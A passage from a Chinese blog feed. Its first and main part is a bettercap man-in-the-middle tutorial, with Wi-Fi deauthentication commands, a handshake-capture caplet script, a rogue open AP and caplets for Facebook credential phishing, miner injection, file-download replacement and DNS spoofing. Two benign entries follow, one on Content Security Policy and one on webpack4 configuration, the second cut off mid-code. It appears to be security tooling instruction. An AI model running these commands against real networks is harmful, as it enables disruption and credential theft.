<p>开启 wifi 探测：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wifi.recon on</span><br></pre></td></tr></table></figure>
<p>如果你对某一 AP 感兴趣，可以指定其 BSSID：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wifi.recon 50:46:5d:6e:8c:20</span><br></pre></td></tr></table></figure>
<p>利用 ticker 显示最新发现的 wifi：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set ticker.commands &apos;clear; wifi.show&apos;</span><br><span class="line">ticker on</span><br></pre></td></tr></table></figure>
<p>发动断网攻击，攻击指定的 AP 或者客户端：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wifi.deauth AP-BSSID</span><br><span class="line">wifi.deauth CLIENT-BSSID</span><br></pre></td></tr></table></figure>
<p>我们可以用下面的命令判断数据包中是否含有 handshake：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r /root/wpa.pcap -R &apos;eapol&apos; -2 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
<p>更直观的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if [ &quot;`tshark -r /root/wpa.pcap -R &apos;eapol&apos; -2 2&gt;/dev/null`&quot; ]; then echo &quot;Got handshake!&quot;; else echo &quot;Nothing&quot;; fi;</span><br></pre></td></tr></table></figure>
<p>接下来我们综合上述内容创建一个 cap 脚本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># Setting up the sniffer</span><br><span class="line">set net.sniff.verbose true</span><br><span class="line">set net.sniff.filter ether proto 0x888e</span><br><span class="line">set net.sniff.output /root/wpa.pcap</span><br><span class="line">net.sniff on</span><br><span class="line"></span><br><span class="line"># Configuring and starting the analysis of wireless networks; channel and BSSID replace with your values</span><br><span class="line">wifi.recon.channel 8</span><br><span class="line">wifi.recon on</span><br><span class="line">sleep 20</span><br><span class="line">wifi.recon 50:46:5d:6e:8c:20</span><br><span class="line"></span><br><span class="line"># Performing the deauthentication attack, sleeping for 60 seconds, checking if a handshake was captured,</span><br><span class="line"># if yes, then quitting bettercap.</span><br><span class="line"># Note that if you changed the name of the file where the handshake is saved, you also need to change</span><br><span class="line"># it here - /root/wpa.pcap, and also replace BSSID with the attacked AP</span><br><span class="line">set ticker.commands wifi.deauth 50:46:5d:6e:8c:20; sleep 60; !&apos;if [ &quot;`tshark -r /root/wpa.pcap -R &apos;eapol&apos; -2 2&gt;/dev/null`&quot; ]; then echo &quot;Got handshake! Quit.&quot;; sleep 1; pkill -1 bettercap; else echo &quot;Yet not captured&quot;; fi;&apos;</span><br><span class="line"># Period of the cycle - only one second is set here, because in the previous set of commands there is a sleep 60;</span><br><span class="line"># which sets the sleep for 60 seconds:</span><br><span class="line">set ticker.period 1</span><br><span class="line"># Run cyclic execution of commands</span><br><span class="line">ticker on</span><br></pre></td></tr></table></figure>
<p>根据脚本运行 bettercap:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo bettercap -iface wlan0 -caplet ./HS_capture_50465d6e8c20.cap</span><br></pre></td></tr></table></figure>
<h3 id="创建伪造-AP"><a href="#创建伪造-AP" class="headerlink" title="创建伪造 AP"></a>创建伪造 AP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set wifi.ap.ssid Banana</span><br><span class="line">set wifi.ap.bssid DE:AD:BE:EF:DE:AD</span><br><span class="line">set wifi.ap.channel 5</span><br><span class="line">set wifi.ap.encryption false</span><br><span class="line">wifi.recon on; wifi.ap</span><br></pre></td></tr></table></figure>
<p>这里可以基于其他设置执行复杂的攻击，比如基于社会工程学的自动攻击。</p>
<h3 id="bettercap-caplet-回顾"><a href="#bettercap-caplet-回顾" class="headerlink" title="bettercap caplet 回顾"></a>bettercap caplet 回顾</h3><p>官方自带了一些 cap 脚本，<a href="https://github.com/bettercap/caplets" target="_blank" rel="external">点击查看</a>。下面我们来看几个典型的脚本怎么使用。</p>
<h4 id="Beef-hooking"><a href="#Beef-hooking" class="headerlink" title="Beef hooking"></a>Beef hooking</h4><p>Beef 通过与客户端的 JS 通信来控制受害者客户端，简单来说是一个 XSS 工具，不了解的可先去学习一下怎么使用 beef。<br>bettercap 提供的与 beef 相关的两个脚本是<a href="https://github.com/bettercap/caplets/blob/master/beef-passive.cap" target="_blank" rel="external">beef-passive.cap</a>， <a href="https://github.com/bettercap/caplets/blob/master/beef-active.cap" target="_blank" rel="external">beef-active.cap</a>，<br>第一个脚本被动注入 JS，第二个脚本主动注入 JS，这两个脚本都会注入<a href="https://github.com/bettercap/caplets/blob/master/beef-inject.js" target="_blank" rel="external">beef-inject.js</a>，查看源码会发现这个 js 文件网 HTML 中注入一个 JS 地址，你需要将这个 JS 地址替换为你的 Beef JS 地址。</p>
<h4 id="矿机注入"><a href="#矿机注入" class="headerlink" title="矿机注入"></a>矿机注入</h4><p><a href="https://github.com/bettercap/caplets/blob/master/crypto-miner.cap" target="_blank" rel="external">crypto-miner.cap</a>会注入矿机，你需要修改<a href="https://github.com/bettercap/caplets/blob/master/crypto-miner.js" target="_blank" rel="external">crypto-miner.js</a>，写入你自己 key。</p>
<h4 id="替换上传下载文件"><a href="#替换上传下载文件" class="headerlink" title="替换上传下载文件"></a>替换上传下载文件</h4><p><a href="https://github.com/bettercap/caplets/blob/master/download-autopwn.cap" target="_blank" rel="external">download-autopwn.cap</a>用于替换下载的文件，需要注意两点：</p>
<ol>
<li>受害者发出请求的 user-agent 字段需要匹配 downloadautopwn.useragent.x regexp 的值</li>
<li>请求的文件扩展名要匹配 downloadautopwn.extensions.x，根据这些扩展名，你可以在 caplets/download-autopwn/找到对应的 downloadautopwn.devices。<br>同时<a href="https://github.com/bettercap/caplets/blob/master/download-autopwn.js" target="_blank" rel="external">download-autopwn.js</a>文件与 download-autopwn.cap 互相配合，这个脚本并不是用于浏览器的，而是用于 http.proxy 模块，控制 bettercap 的行为。<br>执行过后，如果有人上传文件，这边匹配到了就会替换成你对应的 payload。</li>
</ol>
<h4 id="窃取-Facebook-密码"><a href="#窃取-Facebook-密码" class="headerlink" title="窃取 Facebook 密码"></a>窃取 Facebook 密码</h4><p><a href="https://github.com/bettercap/caplets/blob/master/fb-phish.cap" target="_blank" rel="external">fb-phish.cap</a>会在 80 端口放置一个伪造的 facebook 登录页，利用了 http.proxy 模块，有人访问登录了，就会打印捕获的密码，然后重定向到真正的 facebook。<br>这一脚本利用<a href="https://github.com/bettercap/caplets/blob/master/fb-phish.js" target="_blank" rel="external">fb-phish.js</a>文件控制 http.proxy。<br>开始之前要创建一个伪造 login 页面，可以使用 makefile 快速创建：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd caplets/www/</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
<p>然后发起攻击：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">set http.server.address 0.0.0.0</span><br><span class="line">set http.server.path caplets/www/www.facebook.com/</span><br><span class="line"></span><br><span class="line">set http.proxy.script caplets/fb-phish.js</span><br><span class="line"></span><br><span class="line">http.proxy on</span><br><span class="line">http.server on</span><br></pre></td></tr></table></figure>
<h4 id="收集-HTTP-请求"><a href="#收集-HTTP-请求" class="headerlink" title="收集 HTTP 请求"></a>收集 HTTP 请求</h4><p>运行 ARP 欺骗，然后利用<a href="https://github.com/bettercap/caplets/blob/master/http-req-dump.js" target="_blank" rel="external">http-req-dumsp.js</a>来导出与 http.proxy 或者 https.proxy 交互的请求包。</p>
<h4 id="收集-Form-框自动传入数据"><a href="#收集-Form-框自动传入数据" class="headerlink" title="收集 Form 框自动传入数据"></a>收集 Form 框自动传入数据</h4><p>假如浏览器记录了上次登录的 form 框用户名密码，下次打开会自动传入或者进行一些交互之后传入，在 form 框自动传入记录的信息时我们可以利用<a href="https://github.com/bettercap/caplets/blob/master/login-man-abuse.cap" target="_blank" rel="external">login-man-abuse.cap</a>来收集这些信息。<br>例子：<a href="https://miloserdov.org/?goto=28503" target="_blank" rel="external">webpage demo</a></p>
<h4 id="利用-DHCPv6-请求重定向-DNS-请求"><a href="#利用-DHCPv6-请求重定向-DNS-请求" class="headerlink" title="利用 DHCPv6 请求重定向 DNS 请求"></a>利用 DHCPv6 请求重定向 DNS 请求</h4><p>原理介绍：<a href="https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/" target="_blank" rel="external">https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/</a></p>
<p>大概意思是，现代版本中的 windows 系统对 ipv6 有优先权，攻击者发送一个指定攻击者 IP 为 DNS server 的 ipv6 数据包给 windows 受害者，会起到 DNS 欺骗的效果。</p>
<p>利用脚本<a href="https://github.com/bettercap/caplets/blob/master/mitm6.cap" target="_blank" rel="external">mitm6.cap</a>。</p>
<h4 id="http-proxy-测试脚本"><a href="#http-proxy-测试脚本" class="headerlink" title="http.proxy 测试脚本"></a>http.proxy 测试脚本</h4><p><a href="https://github.com/bettercap/caplets/blob/master/proxy-script-test.cap" target="_blank" rel="external">proxy-script-test.cap</a>帮助你测试 js 脚本的运行，这里利用<a href="https://github.com/bettercap/caplets/blob/master/proxy-script-test.js" target="_blank" rel="external">proxy-script-test.js</a>。</p>
<h4 id="密码嗅探"><a href="#密码嗅探" class="headerlink" title="密码嗅探"></a>密码嗅探</h4><p><a href="https://github.com/bettercap/caplets/blob/master/simple-passwords-sniffer.cap" target="_blank" rel="external">simple-passwords-sniffer.cap</a>利用简单的正则来截取密码。</p>
<h4 id="自定义-bettercap-交互提示"><a href="#自定义-bettercap-交互提示" class="headerlink" title="自定义 bettercap 交互提示"></a>自定义 bettercap 交互提示</h4><p><a href="https://github.com/bettercap/caplets/blob/master/test-prompt-stats.cap" target="_blank" rel="external">test-prompt-stats.cap</a></p>
<h4 id="改变-web-页面内容"><a href="#改变-web-页面内容" class="headerlink" title="改变 web 页面内容"></a>改变 web 页面内容</h4><p><a href="https://github.com/bettercap/caplets/blob/master/web-override.cap" target="_blank" rel="external">web-override.cap</a>可以改变为任何攻击者指定页面。利用<a href="https://github.com/bettercap/caplets/blob/master/web-override.js" target="_blank" rel="external">web-override.js</a>脚本控制 http.proxy。<br>如果你想的话，你可以创造自己的 caplet，然后提交到官方的仓库。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>如你所见，bettercap 是一款强大的，非常容易实现各种中间人攻击的工具。<br>以上只是介绍了一部分用法，在实际中还需要自己多加探索。在官方文档有记载所有模块的作用。<br>本文参考自 <a href="https://miloserdov.org/?p=1112" target="_blank" rel="external">https://miloserdov.org/?p=1112</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;bettercap 用于中间人攻击测试，并可以应用于 wifi 网络的一些测试。&lt;/p&gt;
&lt;p&gt;官网：&lt;a href=&quot;https://ww
    
    </summary>
    
    
      <category term="security" scheme="http://myt0.com/tags/security/"/>
    
      <category term="tools" scheme="http://myt0.com/tags/tools/"/>
    
      <category term="network" scheme="http://myt0.com/tags/network/"/>
    
      <category term="spoof" scheme="http://myt0.com/tags/spoof/"/>
    
      <category term="sniff" scheme="http://myt0.com/tags/sniff/"/>
    
  </entry>
  
  <entry>
    <title>内容安全策略</title>
    <link href="http://myt0.com/2018/08/09/CSP/"/>
    <id>http://myt0.com/2018/08/09/CSP/</id>
    <published>2018-08-08T23:47:00.000Z</published>
    <updated>2019-03-01T08:35:25.175Z</updated>
    
    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>内容安全策略(Content Security Policy)可以控制浏览器信任以何种方式、何种来源去加载资源，用于削弱 XSS 的危害，也可以防止使用 HTTP 时被注入恶意代码，通过服务器返回 Content-Security-Policy 来告诉浏览器具体的策略，因此需要浏览器支持。<br>另外 meta 元素也可以设置:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span></span><br><span class="line">    <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span></span><br><span class="line">    <span class="attr">content</span>=<span class="string">"default-src 'self'; img-src https://*; child-src 'none';"</span></span><br><span class="line">/&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里可以看到，CSP 是通过规定可信域，来限制脚本或者其他静态资源的执行。</p>
<h3 id="常见字段"><a href="#常见字段" class="headerlink" title="常见字段"></a>常见字段</h3><p>字段之间通过分号相隔，字段值可以使用通配符，多个值以空格相隔。<br>self 代表本站</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 允许所有内容来源于本站及myt0.com子域名</span></span><br><span class="line">default-src <span class="string">'self'</span> *.myt0.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 所有内容来源于myt0.com，并且要通过https协议，防止监听</span></span><br><span class="line">default-src https://myt0.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 图片来源于所有</span></span><br><span class="line">img-src *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 样式来源设置</span></span><br><span class="line">style-src myt0.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 限制音频地址</span></span><br><span class="line">media-src myt0.com youtube.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 限制JS脚本地址，禁止行内脚本，禁止eval函数</span></span><br><span class="line">script-src myt0.com <span class="string">'unsafe-inline'</span> <span class="string">'unsafe-eval'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 限制&lt;object&gt;, &lt;embed&gt;, &lt;applet&gt;标签的来源</span></span><br><span class="line">object-src https://myt0.com</span><br></pre></td></tr></table></figure>
<p>其他字段的解释及浏览器兼容具体参见<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP" target="_blank" rel="external">MDN 内容安全策略( CSP )</a></p>
<h3 id="报告模式"><a href="#报告模式" class="headerlink" title="报告模式"></a>报告模式</h3><p>Content-Security-Policy-Report-Only 会启用报告模式，不强制采用指定的策略，但是违规的行为会报告给一个指定的 URI，也可以用这个头来进行测试。<br>Content-Security-Policy-Report-Only 和 Content-Security-Policy 同时存在时，两者均有效，前者仅报告，后者强制执行策略。<br>Content-Security-Policy 增加 report-uri 启用违规报告：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: <span class="keyword">default</span>-src <span class="string">'self'</span>; report-uri http:<span class="comment">//reportcollector.example.com/collector.cgi</span></span><br></pre></td></tr></table></figure>
<p>当违规行为发生时，会将违规结果以 POST 方式发送到指定 URI，格式为 JSON，语法如下：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    "csp-report": &#123;</span><br><span class="line">        //发生违规的文档的URI</span><br><span class="line">        "document-uri": "http://example.com/signup.html",</span><br><span class="line">        //违规发生处的文档引用（地址）</span><br><span class="line">        "referrer": "",</span><br><span class="line">        //被CSP阻止的资源URI。如果被阻止的URI来自不同的源而非文档URI，那么被阻止的资源URI会被删减，仅保留协议，主机和端口号。</span><br><span class="line">        "blocked-uri": "http://example.com/css/style.css",</span><br><span class="line">        //违反的策略名称。</span><br><span class="line">        "violated-directive": "style-src cdn.example.com",</span><br><span class="line">        //在 Content-Security-Policy HTTP 头部中指明的原始策略</span><br><span class="line">        "original-policy": "default-src 'none'; style-src cdn.example.com; report-uri /_/csp-reports"</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="nginx-配置"><a href="#nginx-配置" class="headerlink" title="nginx 配置"></a>nginx 配置</h3><p>在 conf 中加入：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add_header Content-Security-Policy <span class="string">"script-src 'self' 'unsafe-inline' 'unsafe-eval' *.youtube.com maps.gstatic.com *.googleapis.com *.google-analytics.com cdnjs.cloudflare.com assets.zendesk.com connect.facebook.net; frame-src 'self' *.youtube.com assets.zendesk.com *.facebook.com s-static.ak.facebook.com tautt.zendesk.com; object-src 'self'"</span>;</span><br></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;内容安全策略(Content Security Policy)可以控制浏览器信任以何种方式、何种来源去加载资源，用于削弱 XSS 的危害，也
    
    </summary>
    
    
      <category term="security" scheme="http://myt0.com/tags/security/"/>
    
      <category term="xss" scheme="http://myt0.com/tags/xss/"/>
    
      <category term="frontend" scheme="http://myt0.com/tags/frontend/"/>
    
  </entry>
  
  <entry>
    <title>webpack4 笔记</title>
    <link href="http://myt0.com/2018/08/01/summary-of-webpack/"/>
    <id>http://myt0.com/2018/08/01/summary-of-webpack/</id>
    <published>2018-08-01T13:00:00.000Z</published>
    <updated>2018-08-04T16:07:45.327Z</updated>
    
    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>本文基于 webpack4 , 用于查询常用配置，算是学习官方文档过后的一个笔记，如果你想全面了解 webpack 的配置，还请参考<a href="https://webpack.js.org/concepts/" target="_blank" rel="external">官方文档</a>。</p>
<h3 id="约定"><a href="#约定" class="headerlink" title="约定"></a>约定</h3><p>webpack4 号称零配置，其约定了一些基本的编译配置。</p>
<ol>
<li>约定入口文件：./src/index.js 作为入口文件，然后将结果输出到 ./dist/main.js</li>
<li>增加 mode 字段：production 或者 development，在 mode=production 时会执行压缩，mode=development 则不会压缩文件。</li>
<li>大量的配置根据 mode 做对应的改变，在 production 时对文件编译做到最优。</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 指定development模式、入口文件、导出文件</span></span><br><span class="line">webpack --mode development ./src/main.js --output ./dist/bundle.js</span><br></pre></td></tr></table></figure>
<p>webpack4 在默认情况下做了大量的约定配置，实际上在一些简单的项目当中，通过增加各种命令行参数，如 mode、module 等就能代替配置文件的作用。<br>但我们要做一些精细、直观的配置，还是要使用配置文件，可以在命令行中指定使用的配置文件，这样我们可以区分 development 和 production 环境。<br>例如：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webpack --config webpack.dev.js</span><br></pre></td></tr></table></figure>
<h3 id="babel"><a href="#babel" class="headerlink" title="babel"></a>babel</h3><p>安装 babel 以支持 ES6</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i babel-core babel-loader babel-preset-env --save-dev</span><br></pre></td></tr></table></figure>
<p>然后建立.babelrc</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"presets"</span>: [<span class="string">"env"</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="entry"><a href="#entry" class="headerlink" title="entry"></a>entry</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 只有一个入口的情况</span></span><br><span class="line">entry: <span class="string">'./src/index.js'</span></span><br><span class="line"><span class="comment">// 可以配置多个入口,适合于多页应用</span></span><br><span class="line">entry: &#123;</span><br><span class="line">    app: <span class="string">'./src/index.js'</span>,</span><br><span class="line">    main: <span class="string">'./src/main.js'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="module"><a href="#module" class="headerlink" title="module"></a>module</h3><p>一个 module 由多个 rule 组成，一个 rule 根据正则对应一类文件，然后对这类文件配置相应的 loader，<a href="https://webpack.js.org/loaders/" target="_blank" rel="external">官方对于所有 loader 的介绍</a>。<br>在 webpack4 中如果你不需要一些复杂的判断，可以在命令行中加入 –module-bind js=babel-loader 来替换配置文件中的 module 中的对应 rule。<br>一个 module 的常见属性介绍：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    <span class="built_in">module</span>: &#123;</span><br><span class="line">        <span class="comment">// 对各类文件进行相应的loader配置</span></span><br><span class="line">        rules: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 通过正则匹配文件</span></span><br><span class="line">                test: <span class="regexp">/\.css$/</span>,</span><br><span class="line">                <span class="comment">// loaders，loader可以是字符串，可以是对象，是对象的时候又可以对具体的loader进行详细的配置</span></span><br><span class="line">                <span class="comment">// 注意：loader的执行顺序是从后往前</span></span><br><span class="line">                use: [],</span><br><span class="line">                <span class="comment">// 只命中的文件目录</span></span><br><span class="line">                include: [</span><br><span class="line">                    path.resolve(__dirname, <span class="string">'src'</span>),</span><br><span class="line">                    path.resolve(__dirname, <span class="string">'tests'</span>)</span><br><span class="line">                ],</span><br><span class="line">                <span class="comment">// 排除的文件目录</span></span><br><span class="line">                exclude: [</span><br><span class="line">                    path.resolve(__dirname, <span class="string">'node_modules'</span>),</span><br><span class="line">                    path.resolve(__dirname, <span class="string">'bower_modules'</span>)</span><br><span class="line">                ],</span><br><span class="line">                <span class="comment">// parser 属性可以更细粒度的配置哪些模块语法要解析哪些不解析</span></span><br><span class="line">                <span class="comment">// 和 noParse 配置项的区别在于 parser 可以精确到语法层面， 而 noParse 只能控制哪些文件不被解析。</span></span><br><span class="line">                parser: &#123;</span><br><span class="line">                    amd: <span class="literal">false</span>, <span class="comment">// disable AMD</span></span><br><span class="line">                    commonjs: <span class="literal">false</span>, <span class="comment">// disable CommonJS</span></span><br><span class="line">                    system: <span class="literal">false</span>, <span class="comment">// disable SystemJS</span></span><br><span class="line">                    harmony: <span class="literal">false</span>, <span class="comment">// disable ES2015 Harmony import/export</span></span><br><span class="line">                    requireInclude: <span class="literal">false</span>, <span class="comment">// disable require.include</span></span><br><span class="line">                    requireEnsure: <span class="literal">false</span>, <span class="comment">// disable require.ensure</span></span><br><span class="line">                    requireContext: <span class="literal">false</span>, <span class="comment">// disable require.context</span></span><br><span class="line">                    browserify: <span class="literal">false</span>, <span class="comment">// disable special handling of Browserify bundles</span></span><br><span class="line">                    requireJs: <span class="literal">false</span>, <span class="comment">// disable requirejs.*</span></span><br><span class="line">                    node: <span class="literal">false</span> <span class="comment">// disable __dirname, __filename, module, require.extensions, require.main, etc.</span></span><br><span class="line">                    <span class="comment">// node: &#123;...&#125; // reconfigure node layer on module level</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="comment">// noParse忽略对没有采用模块化的文件进行递归解析处理，包括import/require/define中的</span></span><br><span class="line">        <span class="comment">// 可以使用正则表达式</span></span><br><span class="line">        <span class="comment">// noParse: /jquery|chartjs/</span></span><br><span class="line">        <span class="comment">// 可以使用函数，从 Webpack 3.0.0 开始支持</span></span><br><span class="line">        noParse: content =&gt; &#123;</span><br><span class="line">            <span class="comment">// content 代表一个模块的文件路径</span></span><br><span class="line">            <span class="keyword">return</span> <span class="regexp">/jquery|chartjs/</span>.test(content)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>例子：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    <span class="built_in">module</span>: &#123;</span><br><span class="line">        rules: [</span><br><span class="line">            &#123;</span><br><span class="line">                test: <span class="regexp">/\.js$/</span>,</span><br><span class="line">                exclude: <span class="regexp">/node_modules/</span>,</span><br><span class="line">                use: <span class="string">'babel-loader'</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                test: <span class="regexp">/\.s?css$/</span>,</span><br><span class="line">                use: [<span class="string">'style-loader'</span>, <span class="string">'css-loader'</span>, <span class="string">'sass-loader'</span>]</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                test: <span class="regexp">/\.html$/</span>,</span><br><span class="line">                use: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        loader: <span class="string">'html-loader'</span>,</span><br><span class="line">                        options: &#123; minimize: <span class="literal">true</span> &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="resolve"><a href="#resolve" class="headerlink" title="resolve"></a>resolve</h3><p>resolve 主要是对导入导出、文件名等做一些配置。<br><a href="https://webpack.js.org/configuration/resolve/" target="_blank" rel="external">官方 resolve 介绍</a></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">modules.exports = &#123;</span><br><span class="line">    resolve: &#123;</span><br><span class="line">        alias: &#123;</span><br><span class="line">            <span class="comment">// 导入语句中的别名替换，import 'components/button' 就表示 import 